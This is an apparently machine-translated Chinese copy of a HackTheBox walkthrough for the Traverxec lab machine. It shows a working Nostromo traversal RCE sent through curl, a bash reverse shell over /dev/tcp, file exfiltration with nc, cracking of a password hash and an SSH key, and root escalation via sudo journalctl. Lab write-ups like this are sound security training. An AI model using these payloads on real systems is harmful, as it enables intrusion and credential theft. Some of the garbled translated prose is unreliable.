# 高温透析器：特拉维塞克

[0xdf.gitlab.io](https://0xdf.gitlab.io/2020/04/11/htb-traverxec.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ftraverxec-cover.png) 

Traverxec是一个相对容易的盒子，涉及枚举和利用一个不太受欢迎的网络服务器Nostromo。我将利用 RCE 漏洞在主机上获取外壳。我只能找到一个元扫描脚本，但这是一个简单的HTTP请求，我可以使用curl重新创建。然后，我将根据用户在服务器上使用Web主目录的情况，透视到用户的私人文件。为了获得根，我将利用与日记ctrl一起使用的 sudo。

## 箱子信息

名字

[特拉弗塞克](https://www.hackthebox.eu/home/machines/profile/217) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-traverxec.png) 

发行日期

[16 11月 2019](https://twitter.com/hackthebox_eu/status/1194894325181759488)

停用日期

11 4月 2020

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ftraverxec-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ftraverxec-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 02小时 26分钟 49秒。[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F38547)](https://www.hackthebox.eu/home/users/profile/38547)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 03小时 06分钟 28秒。[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F91278)](https://www.hackthebox.eu/home/users/profile/91278)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F77141)](https://www.hackthebox.eu/home/users/profile/77141)-

## 侦察

### n地图

`nmap`显示到打开的常见端口，HTTP （TCP 80） 和固态混合信号 （TCP 22）：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.165
    Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-22 07:12 EST
    Nmap scan report for 10.10.10.165
    Host is up (0.014s latency).
    Not shown: 65533 filtered ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
    root@kali# nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.165
    Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-22 10:27 EST
    Nmap scan report for 10.10.10.165
    Host is up (0.014s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
    |   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
    |_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
    80/tcp open  http    nostromo 1.9.6
    |_http-server-header: nostromo 1.9.6
    |_http-title: TRAVERXEC
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.59 seconds
    

基于 [OpenSSH 版本](https://packages.debian.org/search?keywords=openssh-server)，这看起来很可能是德比安·巴斯特。我也看到它没有运行阿帕奇或NGINX，而是诺斯特洛莫。我会深入探讨这个问题。

### 网站 - TCP 80

#### 网站

该网站是为网页设计师准备的：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20191122103037723.png) 

#### 服务器版本

我注意到HTTP服务器报告为诺斯特罗莫。看看HTTP标头，我也看到了它：`nmap`

    HTTP/1.1 200 OK
    Date: Fri, 22 Nov 2019 12:13:28 GMT
    Server: nostromo 1.9.6
    Connection: close
    Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
    Content-Length: 15674
    Content-Type: text/html
    

## 壳牌作为万维数据

### 识别漏洞

`searchsploit`显示了两个潜在的诺斯特罗莫漏洞：

    root@kali# searchsploit nostromo
    -------------------------------------------------------------------- ----------------------------------------
     Exploit Title                                                      |  Path
                                                                        | (/usr/share/exploitdb/)
    -------------------------------------------------------------------- ----------------------------------------
    Nostromo - Directory Traversal Remote Command Execution (Metasploit | exploits/multiple/remote/47573.rb
    nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Executio | exploits/linux/remote/35466.sh
    -------------------------------------------------------------------- ----------------------------------------
    Shellcodes: No Result
    

有一个元浏览器（我避免）和一个外壳脚本。shell 脚本是旧版本的漏洞利用。我将快速浏览一下。它说1.9.4之前的版本会受到影响，所以不在这里。此漏洞利用的工作方式是向 发送 POST。这是基本的目录遍历，使用 （十六进制 ） 必须绕过过滤。然后，无论POST数据是什么，都会传递给。但这在这里行不通。`searchsploit -x exploits/linux/remote/35466.sh``/..%2f..%2f..%2fbin/sh``%2f``/``sh`

一些谷歌搜索揭示了数据包风暴[上无国界医生漏洞的来源](https://packetstormsecurity.com/files/155045/Nostromo-1.9.6-Directory-Traversal-Remote-Command-Execution.html)。它的目标最高为1.9.6，这是特拉弗塞克的版本。阅读源代码，我发现函数：`execute_command`

      def execute_command(cmd, opts = {})
        send_request_cgi({
          'method'  => 'POST',
          'uri'     => normalize_uri(target_uri.path, '/.%0d./.%0d./.%0d./.%0d./bin/sh'),
          'headers' => {'Content-Length:' => '1'},
          'data'    => "echo\necho\n#{cmd} 2>&1"
          }
        )
      end
    

它正在执行与上一个漏洞利用相同的操作，只是这一次，而不是对字符进行url编码，而是在s之间有额外的（或换行符）。`/``%0d``\n``.`

### 利用可编程逻辑控制器

我会开始玩，看看我是否可以让它工作。我将从以下命令开始：.选项包括：`curl``curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d "id | nc 10.10.14.6 443"`

*   `-s`\- 静音进度条和错误消息
*   `-X POST`\- 发送开机自检请求
*   `http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh`\- 目标，通过目录遍历进行访问`/bin/sh`
*   `-d "id | nc 10.10.14.6 443"`\- 我要运行的命令，该命令会将结果发送回我的 box 端口 443 上的侦听器。`id`

当我运行它时，通过收听443，我立即得到结果：`nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.165.
    Ncat: Connection from 10.10.10.165:52998.
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

### 壳

现在我可以运行命令了，我将运行一个命令来获取 shell：

    root@kali# curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
    

该命令只是挂起，但在新的侦听器上：`nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.165.
    Ncat: Connection from 10.10.10.165:53000.
    bash: cannot set terminal process group (458): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@traverxec:/usr/bin$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

## 私人： www-data –>大卫

### 查找固态混合密钥

在粗略地环顾四周之后，我决定上传并运行[LinEnum](https://github.com/rebootuser/LinEnum)。它指出的一件事是一个文件：`.htpasswd`

    [-] htpasswd found - could contain passwords:
    /var/nostromo/conf/.htpasswd
    david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/  
    

我把它拉回来，开始用：`hashcat`

    root@kali# time hashcat -m 500 htpasswd /usr/share/wordlists/rockyou.txt --username --force
    ...[snip]...
    $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me    
    ...[snip]...
    

在目录中，我开始查看配置文件：`/var/nostromo/conf``nhttpd.conf`

    www-data@traverxec:/var/nostromo/conf$ ls -a 
    .  ..  .htpasswd  mimes  nhttpd.conf
    
    www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
    # MAIN [MANDATORY]
    
    servername              traverxec.htb
    serverlisten            *
    serveradmin             david@traverxec.htb
    serverroot              /var/nostromo
    servermimes             conf/mimes
    docroot                 /var/nostromo/htdocs
    docindex                index.html
    
    # LOGS [OPTIONAL]
    
    logpid                  logs/nhttpd.pid
    
    # SETUID [RECOMMENDED]
    
    user                    www-data
    
    # BASIC AUTHENTICATION [OPTIONAL]
    
    htaccess                .htaccess
    htpasswd                /var/nostromo/conf/.htpasswd
    
    # ALIASES [OPTIONAL]
    
    /icons                  /var/nostromo/icons
    
    # HOMEDIRS [OPTIONAL]
    
    homedirs                /home
    homedirs_public         public_www
    

最后两个选项跳出来很有趣。看看[诺斯特罗莫的手册页](http://www.nazgul.ch/dev/nostromo_man.html)，我看到了关于家庭居民的部分：

>     HOMEDIRS
>       To serve the home directories of your users via HTTP, enable the homedirs
>       option by defining the path in where the home directories are stored,
>       normally /home.  To access a users home directory enter a ~ in the URL
>       followed by the home directory name like in this example:
>     
>             http://www.nazgul.ch/~hacki/
>     
>       The content of the home directory is handled exactly the same way as a
>       directory in your document root.  If some users don't want that their
>       home directory can be accessed via HTTP, they shall remove the world
>       readable flag on their home directory and a caller will receive a 403
>       Forbidden response.  Also, if basic authentication is enabled, a user can
>       create an .htaccess file in his home directory and a caller will need to
>       authenticate.
>     
>       You can restrict the access within the home directories to a single sub
>       directory by defining it via the homedirs_public option.
>     

因此，指向主目录，然后在用户目录中，web 根将是 。所以将是.`/homedirs /home``nostromo``public_www``http://10.10.10.165/~david``/home/david/public_www`

我的第一个想法是通过浏览器访问它：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20191122134727465.png) 

我甚至可以使用遍历漏洞在david的主目录中进行探索。尝试了一堆东西：

网址

结果

笔记

`http://10.10.10.165/~david/.%0d./`

空页

可能存在，没有读取权限

`http://10.10.10.165/~david/.%0D./.ssh/`

空

可能存在，没有读取权限

`http://10.10.10.165/~david/.%0D./0xdf/`

404 未找到

不存在（如预期）

`http://10.10.10.165/~david/.%0D./user.txt`

403 禁止访问

存在，但没有读取权限

`http://10.10.10.165/~david/index.html`

上图

我有权阅读此目录

最后一次测试是我想到w数据必须能够在此目录中读取的地方，。所以我回到了我的shell，我不仅可以进入目录，而且那里有一个文件夹：`/home/david/public_www`

    www-data@traverxec:/var/nostromo/conf$ cd /home/david/public_www
    www-data@traverxec:/home/david/public_www$ ls            
    index.html  protected-file-area 
    

在里面，有备份密钥：

    www-data@traverxec:/home/david/public_www$ cd protected-file-area/
    www-data@traverxec:/home/david/public_www/protected-file-area$ ls
    backup-ssh-identity-files.tgz   
    

我会把它寄回我的盒子。通过听我的主机，我会把它发回去：`nc``nc`

    www-data@traverxec:/home/david/public_www/protected-file-area$ cat backup-ssh-identity-files.tgz | nc 10.10.14.6 443  
    

在我的主机上：

    root@kali# nc -lnvp 443 > backup-identity-files.tgz.b64 
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.165.
    Ncat: Connection from 10.10.10.165:53004.
    

我也可以通过Web服务器获取文件。如果我的网址，我得到401未经授权：`curl`

    root@kali# curl 10.10.10.165/~david/protected-file-area/
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <html>
    <head>
    <title>401 Unauthorized</title>
    <meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
    </head>
    <body>
    
    <h1>401 Unauthorized</h1>
    
    <hr>
    <address>nostromo 1.9.6 at 10.10.10.165 Port 80</address>
    </body>
    </html>
    

我可以添加我之前破解的用户名/密码，我可以抓取文件：

    root@kali# wget http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz
    --2019-11-22 14:30:35--  http://david:*password*@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz
    Connecting to 10.10.10.165:80... connected.
    HTTP request sent, awaiting response... 401 Unauthorized
    Authentication selected: Basic realm="David's Protected File Area. Keep out!"
    Reusing existing connection to 10.10.10.165:80.
    HTTP request sent, awaiting response... 200 OK
    Length: 1915 (1.9K) [application/x-tar]
    Saving to: ‘backup-ssh-identity-files.tgz’
    
    backup-ssh-identity-files.tgz         100%[======================================================================>]   1.87K  --.-KB/s    in 0s      
    
    2019-11-22 14:30:35 (47.4 MB/s) - ‘backup-ssh-identity-files.tgz’ saved [1915/1915]
    

我可以使用 解压缩它，并使用私钥获取主目录的备份：`tar`

    root@kali# tar -zxvf backup-ssh-identity-files.tgz 
    home/david/.ssh/
    home/david/.ssh/authorized_keys
    home/david/.ssh/id_rsa
    home/david/.ssh/id_rsa.pub
    root@kali# head home/david/.ssh/id_rsa
    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F
    
    seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
    tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
    KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
    RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
    HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
    Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
    

### 破解钥匙

现在，我将使用 和 来破解 SSH 密钥上的密码：`ssh2john.py``john`

    root@kali# /opt/john/run/ssh2john.py home/david/.ssh/id_rsa > id_rsa.john
    
    root@kali# /opt/john/run/john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
    Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
    Cost 2 (iteration count) is 1 for all loaded hashes
    Will run 3 OpenMP threads
    Note: This format may emit false positives, so it will keep trying even after
    finding a possible candidate.
    Press 'q' or Ctrl-C to abort, almost any other key for status
    hunter           (home/david/.ssh/id_rsa)
    1g 0:00:00:03 DONE (2019-11-22 13:20) 0.3289g/s 4717Kp/s 4717Kc/s 4717KC/s     1990..*7¡Vamos!
    Session completed
    

我喜欢创建一个没有密码保护的副本以供将来使用：

    root@kali# openssl rsa -in home/david/.ssh/id_rsa -out ~/id_rsa_traverxec_david 
    Enter pass phrase for home/david/.ssh/id_rsa:
    writing RSA key
    

### 外壳覆盖固态混合苯

现在我可以以大卫的身份通过SSH连接：

    root@kali# ssh -i ~/id_rsa_traverxec_david david@10.10.10.165
    Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
    Last login: Fri Nov 22 04:55:08 2019 from 10.10.14.59
    david@traverxec:~$
    

并抓取 ：`user.txt`

    david@traverxec:~$ cat user.txt 
    7db0b484************************
    

## 普里夫：大卫->根

### 列举

在 david 的主目录中，在 旁边有一个目录：`user.txt``bin`

    david@traverxec:~$ ls
    bin  public_www  user.txt
    

在其中，有一个脚本来获取服务器统计信息：

    david@traverxec:~/bin$ ls
    server-stats.head  server-stats.sh
    
    david@traverxec:~/bin$ ./server-stats.sh 
                                                                              .----.
                                                                  .---------. | == |
       Webserver Statistics and Data                              |.-"""""-.| |----|
             Collection Script                                    ||       || | == |
              (c) David, 2019                                     ||       || |----|
                                                                  |'-.....-'| |::::|
                                                                  '"")---(""' |___.|
                                                                 /:::::::::::\"    "
                                                                /:::=======:::\
                                                            jgs '"""""""""""""' 
    
    Load:  14:46:14 up 14:45,  2 users,  load average: 0.00, 0.00, 0.00
     
    Open nhttpd sockets: 1
    Files in the docroot: 117
     
    Last 5 journal log lines:
    -- Logs begin at Fri 2019-11-22 00:00:54 EST, end at Fri 2019-11-22 14:46:14 EST. --
    Nov 22 11:45:02 traverxec sudo[1931]: pam_unix(sudo:auth): auth could not identify password for [www-data]
    Nov 22 11:45:02 traverxec sudo[1931]: www-data : command not allowed ; TTY=pts/1 ; PWD=/dev/shm ; USER=root ; COMMAND=list
    Nov 22 11:45:03 traverxec crontab[2016]: (www-data) LIST (www-data)
    Nov 22 13:06:56 traverxec nhttpd[2384]: /~david/../../../bin/sh sent a bad cgi header
    Nov 22 13:07:14 traverxec nhttpd[2386]: /~david/../../../bin/sh sent a bad cgi header
    

如果我看一下脚本，我可以看到它正在做一些事情：

    #!/bin/bash
    
    cat /home/david/bin/server-stats.head
    echo "Load: `/usr/bin/uptime`"
    echo " "
    echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
    echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
    echo " "
    echo "Last 5 journal log lines:"
    /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
    

最有趣的行是最后一行，它是与 的调用。当我运行此脚本时，它从未提示输入我的密码，因此我知道david必须在文件中，因为该命令没有密码。`sudo``/etc/sudoers`

我试图用 来查看配置，但它需要 david 的密码。`sudo``sudo -l`

### 利用日记trl

我会查找[gtf罗宾斯](https://gtfobins.github.io/gtfobins/journalctl/#sudo)，有一个选项。它很短，简单地说：`journalctrl``sudo`

> sudo journalctl ！/bin/sh

这里的诀窍是，如果它可以适应当前页面，它将输出到stdout，但如果不能，则输出到stdout。由于我用 运行它，这意味着只有五行出来，所以我需要将我的终端缩小到小于5行，并且我将以root身份发送到 ，仍然作为root。`journalctrl``less``-n 5``less`

我将从一个小终端开始，并以root身份运行命令：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20191122145122610.png) 

当我按回车键时，我就在（查看第 1-3 行）：`less`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20191122145157286.png) 

现在我可以只键入 ，并且我处于根壳中：`!/bin/bash`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20191122145238952.png) 

现在我可以抓住：`root.txt`

    root@traverxec:~# cat root.txt 
    9aa36a6d************************
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2020/04/11/htb-traverxec.html)